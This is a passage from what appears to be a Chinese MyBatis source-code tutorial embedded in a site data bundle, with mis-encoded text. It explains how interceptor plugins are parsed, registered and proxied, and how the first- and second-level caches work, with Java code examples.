executorï¼çäº§æ§è¡å¨ï¼ ï¼ statementhandlerï¼è¯­å¥å¤çå¨ï¼ ï¼ parameterhandlerï¼åæ°å¤çå¨ï¼ ï¼ resultsethandlerï¼ç»æéå¤çå¨ï¼ è¿åä¸ªå°æ¹åäºæ¦æªï¼å½ä»ç»å°æ§è¡æ­¥éª¤çæ¶åå°±å¯ä»¥çå°å·ä½å®ç°ã\n\n\n# è§£æ\n\nå¸¸è§ç xml éç½®\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.testplugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¸å¿è§£ææ¹æ³\n\nprivate void pluginelement(element parent) throws exception {\n    if (parent == null) return;\n    list<element> elements = parent.elements();\n    for (element element : elements) {\n        // è§£æç±»è·¯å¾\n        string interceptor = element.attributevalue("interceptor");\n        // åæ°éç½®\n        properties properties = new properties();\n        list<element> propertyelementlist = element.elements("property");\n        for (element property : propertyelementlist) {\n            properties.setproperty(property.attributevalue("name"), property.attributevalue("value"));\n        }\n        // è·åæä»¶å®ç°ç±»å¹¶å®ä¾åï¼cn.mybatis.test.plugin.testplugin \n        // éè¿ resources.classforname(string) è·åå®ä¾\n        interceptor interceptorinstance = (interceptor) resolveclass(interceptor).newinstance();\n        // è®¾ç½®éç½®å±æ§\n        interceptorinstance.setproperties(properties);\n        // æ³¨åå° configuration ä¸­\n        configuration.addinterceptor(interceptorinstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ³¨å\n\nè§£æçæ¶åä¼å¨æ¹æ³åé¨æ§è¡ configuration.addinterceptor(interceptorinstance); è¿ä¸æ­¥æ¯ææä»¶ç»´æ¤å° configuration å¨å±éç½®ä¸­ï¼ä½æä»¶å¶å®åºè¯¥æå¾å¤åï¼æä»¥æä¾çæ¯ä¸ä¸ª interceptorchain å¯¹è±¡ç± configuration ç»´æ¤\n\npublic class configuration {\n    // æä»¶æ¦æªå¨é¾\n    protected final interceptorchain interceptorchain = new interceptorchain();\n    public void addinterceptor(interceptor interceptorinstance) {\n        interceptorchain.addinterceptor(interceptorinstance);\n    }\n    // other å¶ä»éç½®\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ninterceptorchain éé¢ç»´æ¤çæ¯ä¸ä¸ªéåï¼ä¸é¨å­æ¾ææç plugin\n\npublic class interceptorchain {\n    // æä»¶æ¦æªå¨å®¹å¨\n    private final list<interceptor> interceptors = new arraylist<>();\n    //\n    public object pluginall(object target) {\n        for (interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // æ·»å å°æä»¶å®¹å¨\n    public void addinterceptor(interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public list<interceptor> getinterceptors(){\n        return collections.unmodifiablelist(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä»è§£æå°æ³¨åè¿ä¸¤æ­¥å°±å¯ä»¥çåºï¼mybatis æ¯ææä»¶ä»¥æ¦æªå¨çå½¢å¼å­æ¾å°ä¸ä¸ªæ¦æªå¨å®¹å¨éï¼è¿ä¸ªå®¹å¨æ¯ configuration å¨å±éç½®ç±»æ¥è¿è¡ç»´æ¤ç\n\n\n# æ§è¡\n\næ§è¡æ¯å¨è°ç¨å·ä½çæ¥è¯¢æ¹æ³æ´»å¶ä»å¨ mybatis éææè¿°ç sql æ¹æ³æ¶è¿è¡çè§¦åï¼è§¦åä¼å¨å¦ä¸ä»£ç ä¸­çä½ç½®ä¸­è§¦åã\n\n  // åå»ºåæ°å¤çå¨\n  public parameterhandler newparameterhandler(mappedstatement mappedstatement, object parameterobject, boundsql boundsql) {\n    parameterhandler parameterhandler = mappedstatement.getlang().createparameterhandler(mappedstatement, parameterobject, boundsql);\n    parameterhandler = (parameterhandler) interceptorchain.pluginall(parameterhandler);\n    return parameterhandler;\n  }\n \n  // åå»ºç»æéå¤çå¨\n  public resultsethandler newresultsethandler(executor executor, mappedstatement mappedstatement, rowbounds rowbounds, parameterhandler parameterhandler,\n      resulthandler resulthandler, boundsql boundsql) {\n    resultsethandler resultsethandler = new defaultresultsethandler(executor, mappedstatement, parameterhandler, resulthandler, boundsql, rowbounds);\n    resultsethandler = (resultsethandler) interceptorchain.pluginall(resultsethandler);\n    return resultsethandler;\n  }\n \n  // åå»ºè¯­å¥å¤çå¨\n  public statementhandler newstatementhandler(executor executor, mappedstatement mappedstatement, object parameterobject, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) {\n    statementhandler statementhandler = new routingstatementhandler(executor, mappedstatement, parameterobject, rowbounds, resulthandler, boundsql);\n    statementhandler = (statementhandler) interceptorchain.pluginall(statementhandler);\n    return statementhandler;\n  }\n\n  // çäº§æ§è¡å¨\n  public executor newexecutor(transaction transaction, executortype executortype) {\n    executortype = executortype == null ? defaultexecutortype : executortype;\n    executortype = executortype == null ? executortype.simple : executortype;\n    executor executor;\n    if (executortype.batch == executortype) {\n      // æ¹éå¤çå¨\n      executor = new batchexecutor(this, transaction);\n    } else if (executortype.reuse == executortype) {\n      executor = new reuseexecutor(this, transaction);\n    } else {\n      // ç®åå¤çå¨\n      executor = new simpleexecutor(this, transaction);\n    }\n    // äºçº§ç¼å­å¤çå¨\n    if (cacheenabled) {\n      executor = new cachingexecutor(executor);\n    }\n    executor = (executor) interceptorchain.pluginall(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nä¼çå°ä»ä¼è°ç¨ interceptorchain#pluginall æ¹æ³ï¼è¯¥ç±»å¨æ³¨åæ­¥éª¤ä¸­ææåå°ï¼éé¢ç»´æ¤äºææçæä»¶ï¼é£ä¹å¨è¿éå°±ä¼æ¶å¾ªç¯ææçæä»¶ï¼æ¯ä¸ªæä»¶è°ç¨ interceptor#plugin\n\n// å¾ªç¯è°ç¨\npublic object pluginall(object target) {\n    for (interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// æ§è¡wrap\npublic interface interceptor {\n    // æ¦æªï¼ä½¿ç¨æ¹å®ç°\n    object intercept(invocation invocation) throws throwable;\n    // ä»£ç\n    default object plugin(object target) {\n        return plugin.wrap(target, this);\n    }\n    // è®¾ç½®å±æ§\n    default void setproperties(properties properties) {\n        // nop\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ninterceptor#plugin æ¹æ³åé¨ä¹å°±æ¯è°ç¨ plugin#wrap éææ¹æ³ï¼è¯¥æ¹æ³éè¿è·åèªå®ä¹æä»¶çæ³¨è§£ï¼æ¥è§å¯ä½ éè¦å¯¹åªä¸ªå¤çå¨ï¼åªä¸ªæ¹æ³ä»¥ååæ°ç±»åå»å¹éæ¦æªå¯¹è±¡çå·ä½æ¹æ³ï¼å¦æå¤ä¸ä¸ªåæ°é½å¯è½æ¾ä¸å°è¦æ¦æªçæ¹æ³ãæ¾å°æ¹æ³åç¶åå»å¨æä»£çè¿ä¸ªæ¹æ³ã\n\n// \npublic class plugin implements invocationhandler {\n    private object target;\n    private interceptor interceptor;\n    private map<class<?>, set<method>> signaturemap;\n\n    private plugin(object target, interceptor interceptor, map<class<?>, set<method>> signaturemap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signaturemap = signaturemap;\n    }\n    // å·ä½çä»£çå®ç°\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        // è·åå£°æçæ¹æ³åè¡¨\n        set<method> methods = signaturemap.get(method.getdeclaringclass());\n        // è¿æ»¤éè¦æ¦æªçæ¹æ³\n        if (methods != null && methods.contains(method)) {\n            // è°ç¨ interceptor#intercept æå¥èªå·±çåå°é»è¾\n            return interceptor.intercept(new invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * ç¨ä»£çæèªå®ä¹æä»¶è¡ä¸ºåè£¹å°ç®æ æ¹æ³ä¸­ï¼ä¹å°±æ¯ plugin.invoke çè¿æ»¤è°ç¨\n     */\n    public static object wrap(object target, interceptor interceptor) {\n        // åå¾ç­¾åmap\n        map<class<?>, set<method>> signaturemap = getsignaturemap(interceptor);\n        // åå¾è¦æ¹åè¡ä¸ºçç±»(parameterhandler|resultsethandler|statementhandler|executor)\n        class<?> type = target.getclass();\n        // åå¾æ¥å£\n        class<?>[] interfaces = getallinterfaces(type, signaturemap);\n        // åå»ºä»£ç(statementhandler)\n        if (interfaces.length > 0) {\n            // ä»£ç\n            return proxy.newproxyinstance(\n                    type.getclassloader(),\n                    interfaces,\n                    new plugin(target, interceptor, signaturemap));\n        }\n        return target;\n    }\n    /**\n     * è·åæ¹æ³ç­¾åç» map\n     */\n    private static map<class<?>, set<method>> getsignaturemap(interceptor interceptor) {\n        // å intercepts æ³¨è§£\n        intercepts interceptsannotation = interceptor.getclass().getannotation(intercepts.class);\n        // å¿é¡»å¾æ intercepts æ³¨è§£ï¼æ²¡ææ¥é\n        if (interceptsannotation == null) {\n            throw new runtimeexception("no @intercepts annotation was found in interceptor " + interceptor.getclass().getname());\n        }\n        // valueæ¯æ°ç»åï¼signatureçæ°ç»\n        signature[] sigs = interceptsannotation.value();\n        // æ¯ä¸ª class ç±»æå¤ä¸ªå¯è½æå¤ä¸ª method éè¦è¢«æ¦æª\n        map<class<?>, set<method>> signaturemap = new hashmap<>();\n        for (signature sig : sigs) {\n            set<method> methods = signaturemap.computeifabsent(sig.type(), k -> new hashset<>());\n            try {\n                // ä¾å¦è·åå°æ¹æ³ï¼statementhandler.prepare(connection connection)ãstatementhandler.parameterize(statement statement)...\n                method method = sig.type().getmethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (nosuchmethodexception e) {\n                throw new runtimeexception("could not find method on " + sig.type() + " named " + sig.method() + ". cause: " + e, e);\n            }\n        }\n        return signaturemap;\n    }\n    /**\n     * åå¾æ¥å£\n     */\n    private static class<?>[] getallinterfaces(class<?> type, map<class<?>, set<method>> signaturemap) {\n        set<class<?>> interfaces = new hashset<class<?>>();\n        while (type != null) {\n            for (class<?> c : type.getinterfaces()) {\n                // æ¦æª parameterhandler|resultsethandler|statementhandler|executor\n                if (signaturemap.containskey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getsuperclass();\n        }\n        return interfaces.toarray(new class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# èªå®ä¹\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.statementhandler;\nimport cn.mybatis.mapping.boundsql;\nimport cn..mybatis.plugin.interceptor;\nimport cn.mybatis.plugin.intercepts;\nimport cn.mybatis.plugin.invocation;\nimport cn.mybatis.plugin.signature;\n\nimport java.sql.connection;\nimport java.util.properties;\n\n@intercepts({@signature(type = statementhandler.class, method = "prepare", args = {connection.class})})\npublic class testplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        // è·åstatementhandler\n        statementhandler statementhandler = (statementhandler) invocation.gettarget();\n        // è·åsqlä¿¡æ¯\n        boundsql boundsql = statementhandler.getboundsql();\n        string sql = boundsql.getsql();\n        // è¾åºsql\n        system.out.println("æ¦æªsqlï¼" + sql);\n        // æ¾è¡\n        return invocation.proceed();\n    }\n\n    @override\n    public void setproperties(properties properties) {\n        system.out.println("åæ°è¾åºï¼" + properties.getproperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç",frontmatter:{title:"æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/302.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.html",relativePath:"00.java/30.Mybatis/31.mybatis/302.æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç.md",key:"v-2504457e",path:"/mybatis/mybatis/302/",headers:[{level:2,title:"ä¸çº§ç¼å­",slug:"ä¸çº§ç¼å­",normalizedTitle:"ä¸çº§ç¼å­",charIndex:13},{level:3,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:292},{level:3,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:1240},{level:3,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:1271},{level:2,title:"äºçº§ç¼å­",slug:"äºçº§ç¼å­",normalizedTitle:"äºçº§ç¼å­",charIndex:18},{level:3,title:"è§£æ",slug:"è§£æ-2",normalizedTitle:"è§£æ",charIndex:292},{level:2,title:"åå¤",slug:"åå¤-2",normalizedTitle:"åå¤",charIndex:1240},{level:2,title:"æ§è¡",slug:"æ§è¡-2",normalizedTitle:"æ§è¡",charIndex:1271}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä¸çº§ç¼å­ è§£æ åå¤ æ§è¡ äºçº§ç¼å­ è§£æ åå¤ æ§è¡",content:'MyBatis çç¼å­åä¸ºä¸çº§ç¼å­åäºçº§ç¼å­ï¼ç¼å­æåµå¦ä¸å¾ï¼åæå¡æ¶æä¸­ï¼æä¸ä»æåªæä¸ä¸ªç¨åºæä¾ç¸åæå¡ï¼ï¼ä¸çº§ç¼å­å¼å¯ä¸ä¼å½±åä¸å¡ï¼åªä¼æé«æ§è½ã å¾®æå¡æ¶æä¸­éè¦å³é­ä¸çº§ç¼å­ï¼åå ï¼Service1 åæ¥è¯¢æ°æ®ï¼è¥ä¹å Service2 ä¿®æ¹äºæ°æ®ï¼ä¹å Service1 ååæ¬¡ä»¥åæ ·çæ¥è¯¢æ¡ä»¶æ¥è¯¢æ°æ®ï¼å èµ°ç¼å­ä¼åºç°æ¥å¤çæ°æ®ä¸æ¯ææ°æ°æ®\n\n\n\n\n# ä¸çº§ç¼å­\n\nä¸çº§ç¼å­æ¯åºäº SQLSession çº§å«çï¼å¨åä¸ä¸ª Session çç¸åæ¥è¯¢è¯­å¥ä¼æä¼ä»ç¼å­ä¸­æ¥è¯¢ï¼æè°ç¸ååæ¬ SQL ç¸åï¼æ¡ä»¶ç¸åç­ï¼é£ä¹æä»¬çä¸å¨æºç ä¸­å·ä½æ¯æä¹ç»´æ¤åä½¿ç¨è¿ä¸ªç¼å­çã\n\n\n# è§£æ\n\næè¿°ä¸çº§ç¼å­åªéè¦å¨ <configuration> æ ç­¾ä¸­æè¿°å³å¯ï¼èä¸çº§ç¼å­ç value å¼æ SESSION å STATEMENT ä¸¤ç§ï¼å¦æè®¾ç½®ä¸º STATEMENT åºæ¬å¯ä»¥ç®æ¯å³é­ä¸çº§ç¼å­ï¼ä¸çº§ç¼å­æ¯ MyBatis æä¾çé»è®¤ç¼å­ï¼æä»¥ä¸ä¼å¨ä»£ç ä¸­çå°å¤æ­ä¸çº§ç¼å­çæ¡ä»¶\n\n<configuration>\n    <settings>\n        \x3c!--ç¼å­çº§å«ï¼SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="SESSION"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£ææ ¸å¿ä»£ç ä¼å¾å° localCacheScopeçå¼ ï¼ç»´æ¤å° configuration å¨å±éç½®ä¸­\n\nprivate void settingsElement(Element context) {\n    if (context == null) return;\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // æ¯å¦å¯ç¨äºçº§ç¼å­\n    configuration.setCacheEnabled(booleanValueOf(props.getProperty("cacheEnabled"), true));\n    // ä¸çº§ç¼å­çéç½®\n    configuration.setLocalCacheScope(LocalCacheScope.valueOf(props.getProperty("localCacheScope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# åå¤\n\nåå¤é¶æ®µä¸»è¦æ¯å¨ openSession æ¹æ³ï¼ä»ä¼å¨æ§è¡å¨éé¢å»ç´æ¥ new PerpetualCache æ°¸ä¹ç¼å­ï¼æ§è¡å¨å°±æ¥æäºè¿ä¸ªç¼å­å¯¹è±¡\n\n// æå¼ä¸ä¸ª session\n@Override\npublic SqlSession openSession() {\n    Transaction tx = null;\n    try {\n        final Environment environment = configuration.getEnvironment();\n        TransactionFactory transactionFactory = environment.getTransactionFactory();\n        tx = transactionFactory.newTransaction(configuration.getEnvironment().getDataSource(), TransactionIsolationLevel.READ_COMMITTED, false);\n        // åå»ºæ§è¡å¨\n        final Executor executor = configuration.newExecutor(tx);\n        // åå»ºDefaultSqlSession\n        return new DefaultSqlSession(configuration, executor);\n    } catch (Exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (SQLException ignore) {\n        }\n        throw new RuntimeException("Error opening session.  Cause: " + e);\n    }\n}\n\n// åå»ºæ§è¡å¨\npublic Executor newExecutor(Transaction transaction) {\n    Executor executor = new SimpleExecutor(this, transaction);\n    // éç½®å¼å¯äºçº§ç¼å­ï¼åå»º CachingExecutor(é»è®¤å°±æ¯æç¼å­)è£é¥°èæ¨¡å¼ï¼\n    if (cacheEnabled) {\n        executor = new CachingExecutor(executor);\n    }\n    return executor;\n}\n\n// SimpleExecutor ç®åæ§è¡å¨çæé æ¹æ³\npublic class SimpleExecutor extends BaseExecutor {\n    public SimpleExecutor(Configuration configuration, Transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// åºç¡æ§è¡å¨çæé æ¹æ³\nprotected BaseExecutor(Configuration configuration, Transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new ä¸ä¸ªæ°¸ä¹ç¼å­\n    this.localCache = new PerpetualCache("LocalCache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nPerpetualCache ç»§æ¿äº Cache ï¼å¹¶å®ç°äºåºæ¬çå¯¹ç¼å­çæä½\n\npublic class PerpetualCache implements Cache {\n    private String id;\n    // ä½¿ç¨HashMapå­æ¾ä¸çº§ç¼å­æ°æ®ï¼session çå½å¨æè¾ç­ï¼æ­£å¸¸æåµä¸æ°æ®ä¸ä¼ä¸ç´å¨ç¼å­å­æ¾\n    private Map<Object, Object> cache = new HashMap<>();\n    public PerpetualCache(String id) {\n        this.id = id;\n    }\n    @Override\n    public String getId() {\n        return id;\n    }\n    @Override\n    public void putObject(Object key, Object value) {\n        cache.put(key, value);\n    }\n    @Override\n    public Object getObject(Object key) {\n        return cache.get(key);\n    }\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# æ§è¡\n\nå¨åå¤é¶æ®µå·²ç»å¾å°äºæ§è¡å¨ï¼å¹¶å¨æ§è¡å¨éé¢å¾å°äº PerpetualCache ç¼å­ï¼åªéè¦ç¥éå®¢æ·ä½¿ç¨çæ¯æ¥è¯¢è¿æ¯ä¿®æ¹ç­æä½åï¼æ§è¡æ§è¡å¨éé¢å¯¹åºç query or update æ¹æ³å³å¯\n\npublic abstract class BaseExecutor implements Executor {\n\n    private org.slf4j.Logger logger = LoggerFactory.getLogger(BaseExecutor.class);\n\n    protected Configuration configuration;\n    protected Transaction transaction;\n    protected Executor wrapper;\n\n    // æ¬å°ç¼å­\n    protected PerpetualCache localCache;\n\n    private boolean closed;\n    // æ¥è¯¢å æ \n    protected int queryStack = 0;\n\n    protected BaseExecutor(Configuration configuration, Transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localCache = new PerpetualCache("LocalCache");\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        clearLocalCache();\n        return doUpdate(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. è·åç»å®SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. åå»ºç¼å­Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        // æ¸çå±é¨ç¼å­ï¼æ¥è¯¢å æ ä¸º0åæ¸çãqueryStack é¿åéå½è°ç¨æ¸ç\n        if (queryStack == 0 && ms.isFlushCacheRequired()) {\n            clearLocalCache();\n        }\n        List<E> list;\n        try {\n            queryStack++;\n            // æ ¹æ®cacheKeyä»localCacheä¸­æ¥è¯¢æ°æ®\n            list = resultHandler == null ? (List<E>) localCache.getObject(key) : null;\n            if (list == null) {\n                list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);\n            }\n        } finally {\n            queryStack--;\n        }\n        if (queryStack == 0) {\n            if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) {\n                clearLocalCache();\n            }\n        }\n        return list;\n    }\n\n    private <E> List<E> queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        List<E> list;\n        localCache.putObject(key, ExecutionPlaceholder.EXECUTION_PLACEHOLDER);\n        try {\n            list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);\n        } finally {\n            localCache.removeObject(key);\n        }\n        // å­å¥ç¼å­\n        localCache.putObject(key, list);\n        return list;\n    }\n\n    protected abstract int doUpdate(MappedStatement ms, Object parameter) throws SQLException;\n\n    protected abstract <E> List<E> doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException;\n\n    @Override\n    public Transaction getTransaction() {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        return transaction;\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Cannot commit, transaction is already closed");\n        }\n        clearLocalCache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        if (!closed) {\n            try {\n                clearLocalCache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        if (!closed) {\n            localCache.clear();\n        }\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        CacheKey cacheKey = new CacheKey();\n        cacheKey.update(ms.getId());\n        cacheKey.update(rowBounds.getOffset());\n        cacheKey.update(rowBounds.getLimit());\n        cacheKey.update(boundSql.getSql());\n        List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n        TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();\n        for (ParameterMapping parameterMapping : parameterMappings) {\n            Object value;\n            String propertyName = parameterMapping.getProperty();\n            if (boundSql.hasAdditionalParameter(propertyName)) {\n                value = boundSql.getAdditionalParameter(propertyName);\n            } else if (parameterObject == null) {\n                value = null;\n            } else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {\n                value = parameterObject;\n            } else {\n                MetaObject metaObject = configuration.newMetaObject(parameterObject);\n                value = metaObject.getValue(propertyName);\n            }\n            cacheKey.update(value);\n        }\n        if (configuration.getEnvironment() != null) {\n            cacheKey.update(configuration.getEnvironment().getId());\n        }\n        return cacheKey;\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            try {\n                rollback(forceRollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (SQLException e) {\n            logger.warn("Unexpected exception on closing transaction.  Cause: " + e);\n        } finally {\n            transaction = null;\n            localCache = null;\n            closed = true;\n        }\n    }\n\n    protected void closeStatement(Statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (SQLException ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n\n\nå¯ä»¥çå° æ§è¡å¨éé¢ç»´æ¤äº query update commit ç­æ¹æ³ï¼å¨æ§è¡æ¥è¯¢çæ¶åä¼åçæ CacheKey ï¼ä¼æç§ namespace.id + åé¡µoffset + åé¡µlimit + æ§è¡çSQLè¯­å¥ + æ¥è¯¢æ¡ä»¶çå¼ + ç¯å¢ID çæå¯ä¸ç keyï¼ç¶ååä¸ºæ¥è¯¢ç¼å­ç keyï¼æ¥è¯¢ç»æåä¸º valueï¼å¦æåä¸å SQLSession æ§è¡ç¸åè¯­å¥åæ¡ä»¶ä»¥ååé¡µç­ï¼å°±ä¼ä»ç¼å­ä¸­å½ä¸­å¹¶è¿åç»æãç¼å­çæ¸é¤ï¼å°±æ¯å½è¯¥ SQLSession æ§è¡ updateï¼commitï¼closeï¼rollback æ¶è¯¥ SQLSession å°±æ¸é¤ç¼å­ã\n\nå¨ SQL è¯­å¥ä¸­ä¹å¯ä»¥è®¾ç½®æ¸é¤ç¼å­ï¼åªéè¦å¨ <select>ã<insert> å <update> ç­ SQL æ ç­¾ä¸­è®¾ç½® flushCache="true" å±æ§ä¼å¼ºå¶æ¸ç©ºæ¬å°ç¼å­ï¼ä½¿å¾ä¸æ¬¡æ¥è¯¢æ¶éæ°ä»æ°æ®åºä¸­è·åæ°æ®ãéç¨äºä¸çº§ç¼å­åäºçº§ç¼å­\n\n<select id="selectById" resultType="com.example.User" flushCache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n\n# äºçº§ç¼å­\n\näºçº§ç¼å­æ¯ä¸º Namespace ä¹å« mapper çº§å«çç¼å­ï¼æ¯è·¨ SQLSession çï¼ä»ä¼å¨åæçæ§è¡å¨ä¸å°è£ä¸ä¸ª CachingExecutor ï¼æ¥ç®¡çç¼å­ï¼ CachingExecutor ä½¿ç¨äºè£é¥°å¨æ¨¡å¼æ¥è£é¥°åºç¡ç Executor æ§è¡å¨ã\n\n\n# è§£æ\n\nå¨äºçº§ç¼å­ä¸­çéç½®æ¹å¼å·ä½å¦ä¸\n\n\x3c!-- å¿é¡»åå¼å¯ç¼å­ --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false äºçº§ç¼å­æ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- æå®å¨æä¸ªmapperä¸­ä½¿ç¨ 